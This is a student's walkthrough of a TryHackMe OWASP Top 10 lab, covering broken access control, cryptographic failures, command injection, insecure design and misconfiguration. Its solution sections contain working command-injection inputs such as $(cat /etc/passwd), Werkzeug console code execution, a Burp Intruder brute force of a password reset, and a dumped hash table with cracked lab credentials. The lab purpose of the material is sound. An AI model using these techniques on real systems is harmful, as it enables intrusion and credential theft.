TASK 1: Introduction
1.  Broken Access Control
2.  Cryptographic Failures
3.  Injection
4.  Insecure Design
5.  Security Misconfiguration
6.  Vulnerable and Outdated Components
7.  Identification and Authentication Failures
8.  Software and Data Integrity Failures
9.  Security Logging & Monitoring Failures
10. Server-Side Request Forgery (SSRF)

TASK 2: Accessing Machines
a. Connect to our network
- Download the compartible configuration file from: https://tryhackme.com/r/access
- then use the command: openvpn file_name

TASK 3: Broken Access Control
- Websites have pages that are protected from regular visitors. For example, only the site's admin user should be able to access a page to manage other users.
- If a website visitor can access protected pages they are not meant to see, then the access controls are broken.
- A regular visitor being able to access protected pages can lead to the following:
    -> Being able to view sensitive information from other users
    -> Accessing unauthorized functionality
- Simply put, broken access control allows attackers to bypass authorisation, allowing them to view sensitive data or perform tasks they aren't supposed to.
- For example, a vulnerability was found in 2019, where an attacker could get any single frame from a Youtube video marked as private. The researcher who found the vulnerability showed that he could ask for several frames and somewhat reconstruct the video.
- Since the expectation from a user when marking a video as private would be that nobody had access to it, this was indeed accepted as a broken access control vulnerability.

TASK 4: Broken Access Control (IDOR Challenge)
- Insecure Direct Object Reference: refers to an access control vulnerability where you can access resources you wouldn't ordinarily be able to see. 
- This occurs when the programmer exposes a Direct Object Reference, which is just an identifier that refers to specific objects within the server. 
- By object, we could mean a file, a user, a bank account in a banking application, or anything really.
- For example
    ->let's say we're logging into our bank account, and after correctly authenticating ourselves, we get taken to a URL like this https://bank.thm/account?id=111111.
    -> On that page, we can see all our important bank details, and a user would do whatever they need to do and move along their way, thinking nothing is wrong.
    -> There is, however, a potentially huge problem here, anyone may be able to change the id parameter to something else like 222222, and if the site is incorrectly configured, then he would have access to someone else's bank information.
- The application exposes a direct object reference through the id parameter in the URL, which points to specific accounts.
- Since the application isn't checking if the logged-in user owns the referenced account, an attacker can get sensitive information from other users because of the IDOR vulnerability.
- Notice that direct object references aren't the problem, but rather that the application doesn't validate if the logged-in user should have access to the requested account.

a. Deploy the machine and go to http://10.10.224.142 - Login with the username noot and the password test1234.
open the url and login change the id parameter till you find the flag keep note what is writen in the page for each of the id till you find the flag.

TASK 5: Cryptographic Failures
- A cryptographic failure refers to any vulnerability arising from the misuse (or lack of use) of cryptographic algorithms for protecting sensitive information. 
- Web applications require cryptography to provide confidentiality for their users at many levels.

- Take, for example, a secure email application:
- When you are accessing your email account using your browser, you want to be sure that the communications between you and the server are encrypted. That way, any eavesdropper trying to capture your network packets won't be able to recover the content of your email addresses.
- When we encrypt the network traffic between the client and server, we usually refer to this as encrypting data in transit.
- Since your emails are stored in some server managed by your provider, it is also desirable that the email provider can't read their client's emails. To this end, your emails might also be encrypted when stored on the servers. This is referred to as encrypting data at rest.

- Cryptographic failures often end up in web apps accidentally divulging sensitive data. This is often data directly linked to customers (e.g. names, dates of birth, financial information), but it could also be more technical information, such as usernames and passwords.
- At more complex levels, taking advantage of some cryptographic failures often involves techniques such as "Man in The Middle Attacks", whereby the attacker would force user connections through a device they control.
- Then, they would take advantage of weak encryption on any transmitted data to access the intercepted information (if the data is even encrypted in the first place). Of course, many examples are much simpler, and vulnerabilities can be found in web apps that can be exploited without advanced networking knowledge.
- Indeed, in some cases, the sensitive data can be found directly on the web server itself.

TASK 6: Cryptographic Failures (Supporting Material 1)
- The most common way to store a large amount of data in a format easily accessible from many locations is in a database.
- This is perfect for something like a web application, as many users may interact with the website at any time. Database engines usually follow the Structured Query Language (SQL) syntax.
- In a production environment, it is common to see databases set up on dedicated servers running a database service such as MySQL or MariaDB; however, databases can also be stored as files. 
- These are referred to as "flat-file" databases, as they are stored as a single file on the computer. This is much easier than setting up an entire database server and could potentially be seen in smaller web applications. 
- flat-file databases are stored as a file on the disk of a computer. Usually, this would not be a problem for a web app, but what happens if the database is stored underneath the root directory of the website (i.e. one of the files accessible to the user connecting to the website)
-  Well, we can download and query it on our own machine, with full access to everything in the database. Sensitive Data Exposure, indeed!

- The most common (and simplest) format of a flat-file database is an SQLite database. These can be interacted with in most programming languages and have a dedicated client for querying them on the command line.
- This client is called sqlite3 and is installed on many Linux distributions by default.
    -> To access it, we use sqlite3 <database-name>
    -> From here, we can see the tables in the database by using the .tables command:
    -> PRAGMA table_info(table_name); to see the table information. 
    -> SELECT * FROM table-name;  to dump the information from the table

TASK 7:Cryptographic Failures (Supporting Material 2)
- We saw how to query an SQLite database for sensitive data in the previous task. We found a collection of password hashes, one for each user. In this task, we will briefly cover how to crack these.
- Crackstation: This website is extremely good at cracking weak password hashes. 
- For more complicated hashes, we would need more sophisticated tools; however, all of the crackable password hashes used in today's challenge are weak MD5 hashes, which Crackstation should handle very nicely.
- Let's try pasting the password hash for Joy Paulson, which we found in the previous task (5f4dcc3b5aa765d61d8327deb882cf99). We solve the Captcha, then click the "Crack Hashes" button:
- We see that the hash was successfully broken, and the user's password was "password". How secure!
- It's worth noting that Crackstation works using a massive wordlist. If the password is not in the wordlist, then Crackstation will not be able to break the hash.
- The challenge is guided, so if Crackstation fails to break a hash in today's box, you can assume that the hash has been specifically designed not to be crackable.

TASK 8: Cryptographic Failures (Challenge)
-Open the website
- go to login page
- check its source code

<!DOCTYPE html>
<html>
	<head>
		<title>Login</title>
		<meta name="viewport" content="width=device-width, user-scalable=no">
		<meta charset="utf-8">
		<link rel="shortcut icon" type="image/x-icon" href="../favicon.ico">
		<link type="text/css" rel="stylesheet" href="assets/css/style.css">
		<link type="text/css" rel="stylesheet" href="assets/css/loginStyle.css">
		<link type="text/css" rel="stylesheet" href="assets/css/orkney.css">
		<link type="text/css" rel="stylesheet" href="assets/css/icons.css">
		<script src="assets/js/jquery-3.5.1.min.js"></script>
	</head>
	<body>
		<header>
			<a id="home" href="/">Sense and Sensitivity</a>
			<a id="login" href="/login.php">Login</a>
		</header>
		<div class=background></div>
		<!-- Must remember to do something better with the database than store it in /assets... -->
		<main>
			<div class="content">
				<form method="POST">
					<input type="text" name="user" placeholder="Username"><br>
					<input type="password" name="pass" placeholder="Password"><br>
					<input id="loginBtnFunc" type="submit" value="Login!">
				</form>
							</div>
		</main>
		<footer><span>&copy; Sense and Sensitivity, 2022</span></footer>
	</body>
</html>
- as you can see that the path to js file for the login page is through /assets check if you can go to that page
http://10.10.129.5:81/assets/ search you can see the contents of the files. you will be able to download the file.
webaap.db
a. What is the name of the mentioned directory?
sol. /assets

b. Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?
sol. webapp.db
┌──(root㉿kali)-[/home/kali/Downloads]
└─# ls              
Bidyasahu.ovpn  breach-parse  burpsuite_pro_linux_v2024_3_1_4.sh  cacert.der  ctf  Nessus-10.7.2-ubuntu1404_amd64.deb  nessus.txt  ransom-letter.doc  starting_point_Bidya0sahu.ovpn  temtar.txt  webapp.db
                                                                                                                                                                                                                                           
┌──(root㉿kali)-[/home/kali/Downloads]
└─# sqlite3 webapp.db
SQLite version 3.44.2 2023-11-24 11:41:44
Enter ".help" for usage hints.
sqlite> .tables
sessions  users   
sqlite> PRAGMA TABLE_INFO(users);
0|userID|TEXT|1||1
1|username|TEXT|1||0
2|password|TEXT|1||0
3|admin|INT|1||0
sqlite> select * from users;
4413096d9c933359b898b6202288a650|admin|6eea9b7ef19179a06954edd0f6c05ceb|1
23023b67a32488588db1e28579ced7ec|Bob|ad0234829205b9033196ba818f7a872b|1
4e8423b514eef575394ff78caed3254d|Alice|268b38ca7b84f44fa0a6cdc86e6301e0|0
sqlite> 

c. Use the supporting material to access the sensitive data. What is the password hash of the admin user?
sol. 6eea9b7ef19179a06954edd0f6c05ceb

d. Crack the hash.
What is the admin's plaintext password?
sol. qwertyuiop
- login with the new found credentials.

e. Log in as the admin. What is the flag?
sol. THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}

TASK 9: Injection
- Injection flaws occur because the application interprets user-controlled input as commands or parameters.
- Injection attacks depend on what technologies are used and how these technologies interpret the input.
- Some common examples include:
	-> SQL Injection: This occurs when user-controlled input is passed to SQL queries.
	As a result, an attacker can pass in SQL queries to manipulate the outcome of such queries.
	This could potentially allow the attacker to access, modify and delete information in a database when this input is passed into database queries.
	This would mean an attacker could steal sensitive information such as personal details and credentials.
	-> Command Injection: This occurs when user input is passed to system commands. 
	As a result, an attacker can execute arbitrary system commands on application servers, potentially allowing them to access users' systems.

- The main defence for preventing injection attacks is ensuring that user-controlled input is not interpreted as queries or commands. There are different ways of doing this:
	-> Using an allow list: when input is sent to the server, this input is compared to a list of safe inputs or characters. If the input is marked as safe, then it is processed.
	Otherwise, it is rejected, and the application throws an error.
	-> Stripping input: If the input contains dangerous characters, these are removed before processing.

- Dangerous characters or input is classified as any input that can change how the underlying data is processed. Instead of manually constructing allow lists or stripping input, various libraries exist that can perform these actions for you.

TASK 10: Command Injection
- Command Injection occurs when server-side code (like PHP) in a web application makes a call to a function that interacts with the server's console directly.
- An injection web vulnerability allows an attacker to take advantage of that call to execute operating system commands arbitrarily on the server.
- The possibilities for the attacker from here are endless: they could list files, read their contents, run some basic commands to do some recon on the server or whatever they wanted,
  just as if they were sitting in front of the server and issuing commands directly into the command line. 
- Once the attacker has a foothold on the web server, they can start the usual enumeration of your systems and look for ways to pivot around.
- Code Example
	-> Let's consider a scenario: MooCorp has started developing a web-based application for cow ASCII art with customisable text.
	-> While searching for ways to implement their app, they've come across the cowsay command in Linux, which does just that! 
	Instead of coding a whole web application and the logic required to make cows talk in ASCII, they decide to write some simple code that calls the cowsay command from the operating system's console
	and sends back its contents to the website.
	-> Let's look at the code they used for their app.  See if you can determine why their implementation is vulnerable to command injection.  We'll go over it below.

<?php
    if (isset($_GET["mooing"])) {
        $mooing = $_GET["mooing"];
        $cow = 'default';

        if(isset($_GET["cow"]))
            $cow = $_GET["cow"];
        
        passthru("perl /usr/bin/cowsay -f $cow $mooing");
    }
?>

In simple terms, the above snippet does the following:
- Checking if the parameter "mooing" is set. If it is, the variable $mooing gets what was passed into the input field.
- Checking if the parameter "cow" is set. If it is, the variable $cow gets what was passed through the parameter.
- The program then executes the function passthru("perl /usr/bin/cowsay -f $cow $mooing");. The passthru function simply executes a command in the operating system's console and sends the output back to the user's browser.
  You can see that our command is formed by concatenating the $cow and $mooing variables at the end of it. Since we can manipulate those variables, we can try injecting additional commands by using simple tricks.
  If you want to, you can read the docs on passthru() on PHP's website for more information on the function itself.
- Exploiting Command Injection: Now that we know how the application works behind the curtains, we will take advantage of a bash feature called "inline commands" to abuse the cowsay server and execute any arbitrary command we want.
  Bash allows you to run commands within commands. This is useful for many reasons, but in our case, it will be used to inject a command within the cowsay server to get it executed.
- To execute inline commands, you only need to enclose them in the following format $(your_command_here). If the console detects an inline command, it will execute it first and then use the result as the parameter for the outer command.
  Look at the following example, which runs whoami as an inline command inside an echo command:
- Since the application accepts any input from us, we can inject an inline command which will get executed and used as a parameter for cowsay. This will make our cow say whatever the command returns! In case you are not that familiar with Linux, here are some other commands you may want to try:
whoami
id
ifconfig/ip addr
uname -a
ps -ef
To complete the questions below, navigate to http://MACHINE_IP:82/ and exploit the cowsay server.

a. What strange text file is in the website's root directory?
sol. drpepper.txt
command: $(ls -la)
total 24 drwxr-xr-x 4 root root 4096 Feb 3 2023 .
drwxr-xr-x 1 root root 4096 Feb 3 2023 ..
drwxr-xr-x 2 root root 4096 Sep 9 2022 css 
-rw-r--r-- 1 root root 78 Feb 3 2023 drpepper.txt 
-rw-r--r-- 1 root root 2402 Sep 9 2022 index.php 
drwxr-xr-x 2 root root 4096 Sep 9 2022 js  

b. How many non-root/non-service/non-daemon users are there?
sol. 0

c. What user is this app running as?
sol. apache
command: $(whoami)
 ________ 
< apache >
 -------- 
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||

d. What is the user's shell set as?
sol. sbin/nologin
command: $(cat /etc/passwd | grep usr)
 _________________________________________ 
/ news:x:9:13:news:/usr/lib/news:/sbin/no \
| login                                   |
| man:x:13:15:man:/usr/man:/sbin/nologin  |
| games:x:35:35:games:/usr/games:/sbin/no |
| login                                   |
\ cyrus:x:85:12::/usr/cyrus:/sbin/nologin /
 ----------------------------------------- 
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
                    
e. What version of Alpine Linux is running?
sol. 3.16.0
command: $(cat /etc/os-release)
 _________________________________________ 
/ NAME="Alpine Linux" ID=alpine           \
| VERSION_ID=3.16.0 PRETTY_NAME="Alpine   |
| Linux v3.16"                            |
| HOME_URL="https://alpinelinux.org/"     |
| BUG_REPORT_URL="https://gitlab.alpineli |
\ nux.org/alpine/aports/-/issues"         /
 ----------------------------------------- 
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||

TASK 11: Insecure Design
- It refers to vulnerabilities which are inherent to the application's architecture. 
- They are not vulnerabilities regarding bad implementations or configurations, but the idea behind the whole application (or a part of it) is flawed from the start. 
- Most of the time, these vulnerabilities occur when an improper threat modelling is made during the planning phases of the application and propagate all the way up to your final app.
  Some other times, insecure design vulnerabilities may also be introduced by developers while adding some "shortcuts" around the code to make their testing easier.
  A developer could, for example, disable the OTP validation in the development phases to quickly test the rest of the app without manually inputting a code at each login but forget to re-enable it when sending the application to production.
- Insecure Password Resets
	-> A good example of such vulnerabilities occurred on Instagram a while ago. Instagram allowed users to reset their forgotten passwords by sending them a 6-digit code to their mobile number via SMS for validation.
	If an attacker wanted to access a victim's account, he could try to brute-force the 6-digit code. As expected, this was not directly possible as Instagram had rate-limiting implemented so that after 250 attempts, the user would be blocked from trying further.
	-> Bruteforcing code: However, it was found that the rate-limiting only applied to code attempts made from the same IP. If an attacker had several different IP addresses from where to send requests, he could now try 250 codes per IP.
	For a 6-digit code, you have a million possible codes, so an attacker would need 1000000/250 = 4000 IPs to cover all possible codes. 
	This may sound like an insane amount of IPs to have, but cloud services make it easy to get them at a relatively small cost, making this attack feasible.
- Notice how the vulnerability is related to the idea that no user would be capable of using thousands of IP addresses to make concurrent requests to try and brute-force a numeric code. The problem is in the design rather than the implementation of the application in itself.
- Since insecure design vulnerabilities are introduced at such an early stage in the development process, resolving them often requires rebuilding the vulnerable part of the application from the ground up and is usually harder to do than any other simple code-related vulnerability.
- The best approach to avoid such vulnerabilities is to perform threat modelling at the early stages of the development lifecycle.

a. Navigate to http://MACHINE_IP:85 and get into joseph's account. This application also has a design flaw in its password reset mechanism. Can you figure out the weakness in the proposed design and how to abuse it? Try to reset joseph's password. Keep in mind the method used by the site to validate if you are indeed joseph.
By looking at the password reset page i had to answer only one of the question and one of the question is about favouraite colors so we can try each colour one by one and since there is no limits there will be no problem.
and to do so:
open burpsuite
go to proxy turn on interception and then continue to the page where you can reset the password by clicking forward.
you will see a http request

POST /resetpass2.php HTTP/1.1
Host: 10.10.150.134:85
Content-Length: 9
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.150.134:85
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.150.134:85/resetpass2.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=fvb0el0g6q4gv9vvftnqgv0nk6
Connection: close
q=2&a=red

click action to intruder 
go to intruder click payloads load the list of colors at payload settings
click position and add payload marker at the end line at a= payload marker
click setting and set "Error: Incorrect answer! Try again." at grep - match . select follow redirection always option and process cookies in redirections
start attack and scroll till the error incorrect column is empty that colour will be the solution then check it's response you will get the password
HTTP/1.1 200 OK
Date: Tue, 19 Nov 2024 14:13:04 GMT
Server: Apache/2.4.54 (Unix)
X-Powered-By: PHP/8.0.21
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 637
Keep-Alive: timeout=5, max=99
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="css/main.css" />
</head>
<body>

<div id="id01" class="modal">
  
  <form class="modal-content animate" action="resetpass2.php" method="post">
    <div class="imgcontainer">
      <img src="imgs/favicon.png" alt="Avatar" class="avatar">
      <h2>Password Reset</h2>
    </div>

    <div class="container">
      <p style="color:red"><b>Success:</b> The password for user joseph has been reset to mwUz0tnxQlK6hu</p>
      <a href="./">&lt;&lt; Back to Login</a>
    </div>
  </form>
</div>

</body>
</html>

login with credentials and you can find the flag.txt file and get the flag
b. What is the value of the flag in joseph's account?
sol. THM{Not_3ven_c4tz_c0uld_sav3_U!}

TASK 12: Security Misconfiguration
- Security Misconfigurations are distinct from the other Top 10 vulnerabilities because they occur when security could have been appropriately configured but was not.
- Even if you download the latest up-to-date software, poor configurations could make your installation vulnerable.
- Security misconfigurations include:
	-> Poorly configured permissions on cloud services, like S3 buckets.
	-> Having unnecessary features enabled, like services, pages, accounts or privileges.
	-> Default accounts with unchanged passwords.
	-> Error messages that are overly detailed and allow attackers to find out more about the system.
	-> Not using HTTP security headers.
- This vulnerability can often lead to more vulnerabilities, such as default credentials giving you access to sensitive data, XML External Entities (XXE) or command injection on admin pages.
- For more info: https://owasp.org/Top10/A05_2021-Security_Misconfiguration/
- Debugging Interfaces

- A common security misconfiguration concerns the exposure of debugging features in production software.
- Debugging features are often available in programming frameworks to allow the developers to access advanced functionality that is useful for debugging an application while it's being developed.
- Attackers could abuse some of those debug functionalities if somehow, the developers forgot to disable them before publishing their applications.
- One example of such a vulnerability was allegedly used when Patreon got hacked in 2015. Five days before Patreon was hacked, a security researcher reported to Patreon that he had found an open debug interface for a Werkzeug console.
- Werkzeug is a vital component in Python-based web applications as it provides an interface for web servers to execute the Python code. 
- Werkzeug includes a debug console that can be accessed either via URL on /console, or it will also be presented to the user if an exception is raised by the application.
- In both cases, the console provides a Python console that will run any code you send to it. For an attacker, this means he can execute commands arbitrarily.

- Navigate to http://10.10.103.151:86 and try to exploit the security misconfiguration to read the application's source code.
Navigate to http://10.10.103.151:86/console to access the Werkzeug console.
Use the Werkzeug console to run the following Python code to execute the ls -l command on the server:
			import os; print(os.popen("ls -l").read())

a. What is the database file name (the one with the .db extension) in the current directory?
sol. todo.db


[console ready]
>>> import os; print(os.popen("ls -l").read())
total 24
-rw-r--r--    1 root     root           249 Sep 15  2022 Dockerfile
-rw-r--r--    1 root     root          1411 Feb  3  2023 app.py
-rw-r--r--    1 root     root           137 Sep 15  2022 requirements.txt
drwxr-xr-x    2 root     root          4096 Sep 15  2022 templates
-rw-r--r--    1 root     root          8192 Nov 21 16:04 todo.db
>>> import os; print(os.popen("cat app.py").read())
import os
from flask import Flask, render_template, request, redirect, url_for
from flask_sqlalchemy import SQLAlchemy
secret_flag = "THM{Just_a_tiny_misconfiguration}"
PROJECT_ROOT = os.path.dirname(os.path.realpath(__file__))
DATABASE = os.path.join(PROJECT_ROOT, 'todo.db')
app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = "sqlite:////" + DATABASE
db = SQLAlchemy(app)
...

b. Modify the code to read the contents of the app.py file, which contains the application's source code. What is the value of the secret_flag variable in the source code?
sol. THM{Just_a_tiny_misconfiguration}

TASK 13: Vulnerable and Outdated Components
